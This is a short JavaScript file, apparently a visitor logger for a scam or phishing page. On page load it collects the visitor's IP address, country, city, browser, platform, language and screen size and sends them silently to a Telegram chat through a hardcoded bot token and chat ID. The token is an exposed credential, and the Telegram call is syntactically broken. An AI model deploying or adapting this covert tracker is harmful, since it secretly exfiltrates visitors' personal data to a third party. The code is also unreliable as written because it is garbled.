const telegramToken = "7561292802:AAFzIeyLlrjO4mBfkRLa1TfzjWwtYpDO2Zg";
const telegramChatId = "-4827057698";

function enviarMensajeTelegram(mensaje) {
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

    axios.post(url, {
        chat_id: telegramChatId,
        text: mensaje
    })|
    })
    .catch(error => {
        console.error("Error al enviar mensaje a Telegram:", error);
    });
}

function obtenerInfoDispositivo() {
    const userAgent = navigator.userAgent;
    const plataforma = navigator.platform;
    const fechaHora = new Date().toLocaleString();
    const idioma = navigator.language;
    const resolucionPantalla = `${screen.width}x${screen.height}`;
    const dominio = window.location.hostname;

    return {
        userAgent,
        plataforma,
        fechaHora,
        idioma,
        resolucionPantalla,
        dominio
    };
}

function obtenerEmojiBandera(codigoPais) {
    const codePoints = [...codigoPais.toUpperCase()].map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

window.addEventListener("DOMContentLoaded", function() {
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            const pais = data.country_name;
            const codigoPais = data.country_code;
            const bandera = obtenerEmojiBandera(codigoPais);
            const ciudad = data.city; // <-- Aquí obtenemos la ciudad

            const infoDispositivo = obtenerInfoDispositivo();
            const mensajeAlerta = `Activo/ADS/"Repuestos"\n` +
                                `Dominio: ${infoDispositivo.dominio}\n` +
                                `IP: ${ip} (${pais} ${bandera}, ${ciudad})\n` + // <-- Añadimos la ciudad aquí
                                `Dispositivo: ${infoDispositivo.plataforma}\n` +
                                `Software: ${infoDispositivo.userAgent}\n` +
                                `Idioma del navegador: ${infoDispositivo.idioma}\n` +
                                `Resolución de pantalla: ${infoDispositivo.resolucionPantalla}\n` +
                                `Fecha y hora: ${infoDispositivo.fechaHora}`;

            setTimeout(() => {
                enviarMensajeTelegram(mensajeAlerta);
            }, 1000);
        });
});